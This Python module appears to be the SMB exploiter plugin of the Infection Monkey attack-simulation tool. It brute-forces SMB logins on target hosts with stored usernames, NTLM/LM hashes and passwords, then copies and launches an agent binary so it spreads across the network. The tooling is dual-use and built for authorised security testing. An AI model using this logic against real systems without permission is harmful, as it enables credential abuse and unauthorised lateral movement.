import logging
from functools import partial
from pprint import pformat
from typing import Any, Dict, Sequence

# common imports
from monkeytypes import AgentID, Event, LMHash, NTHash, Password, Username

from common.event_queue import IAgentEventPublisher

# dependencies to get rid of or internalize
from infection_monkey.exploit import IAgentBinaryRepository, IAgentOTPProvider
from infection_monkey.exploit.tools import (
    BruteForceCredentialsProvider,
    BruteForceExploiter,
    all_tcp_ports_are_closed,
    generate_brute_force_credentials,
    identity_type_filter,
    secret_type_filter,
)
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.i_puppet import ExploiterResult, TargetHost
from infection_monkey.local_machine_info import LocalMachineInfo
from infection_monkey.propagation_credentials_repository import IPropagationCredentialsRepository

from .smb_command_builder import build_smb_command
from .smb_options import SMBOptions
from .smb_remote_access_client import SMB_PORTS
from .smb_remote_access_client_factory import SMBRemoteAccessClientFactory

logger = logging.getLogger(__name__)


def should_attempt_exploit(host: TargetHost) -> bool:
    return not all_tcp_ports_are_closed(host, SMB_PORTS)


class Plugin:
    def __init__(
        self,
        *,
        plugin_name: str,
        agent_id: AgentID,
        agent_event_publisher: IAgentEventPublisher,
        agent_binary_repository: IAgentBinaryRepository,
        propagation_credentials_repository: IPropagationCredentialsRepository,
        otp_provider: IAgentOTPProvider,
        agent_otp_environment_variable: str,
        local_machine_info: LocalMachineInfo,
        **kwargs,
    ):
        self._plugin_name = plugin_name
        self._agent_id = agent_id
        self._agent_event_publisher = agent_event_publisher
        self._agent_binary_repository = agent_binary_repository
        credentials_generator = partial(
            generate_brute_force_credentials,
            identity_filter=identity_type_filter([Username]),
            secret_filter=secret_type_filter([LMHash, NTHash, Password]),
        )
        self._credentials_provider = BruteForceCredentialsProvider(
            propagation_credentials_repository, credentials_generator
        )
        self._otp_provider = otp_provider
        self._agent_otp_environment_variable = agent_otp_environment_variable

    def run(
        self,
        *,
        host: TargetHost,
        servers: Sequence[str],
        current_depth: int,
        options: Dict[str, Any],
        interrupt: Event,
        **kwargs,
    ) -> ExploiterResult:
        try:
            logger.debug(f"Parsing options: {pformat(options)}")
            smb_options = SMBOptions(**options)
        except Exception as err:
            msg = f"Failed to parse SMB options: {err}"
            logger.exception(msg)
            return ExploiterResult(error_message=msg)

        if not should_attempt_exploit(host):
            msg = f"Host {host.ip} has no open SMB ports"
            logger.debug(msg)
            return ExploiterResult(
                exploitation_success=False, propagation_success=False, error_message=msg
            )

        command_builder = partial(
            build_smb_command,
            self._agent_id,
            servers,
            current_depth,
            remote_agent_binary_destination_path=get_agent_dst_path(host),
            agent_otp_environment_variable=self._agent_otp_environment_variable,
            otp_provider=self._otp_provider,
        )
        smb_exploit_client_factory = SMBRemoteAccessClientFactory(
            host, smb_options, command_builder
        )

        brute_force_exploiter = BruteForceExploiter(
            self._plugin_name,
            self._agent_id,
            get_agent_dst_path(host),
            smb_exploit_client_factory,
            self._credentials_provider,
            self._agent_binary_repository,
            self._agent_event_publisher,
            {"smb-exploiter"},
        )

        try:
            logger.debug(f"Running SMB exploiter on host {host.ip}")
            return brute_force_exploiter.exploit_host(host, interrupt)
        except Exception as err:
            msg = f"An unexpected exception occurred while attempting to exploit host: {err}"
            logger.exception(msg)
            return ExploiterResult(error_message=msg)
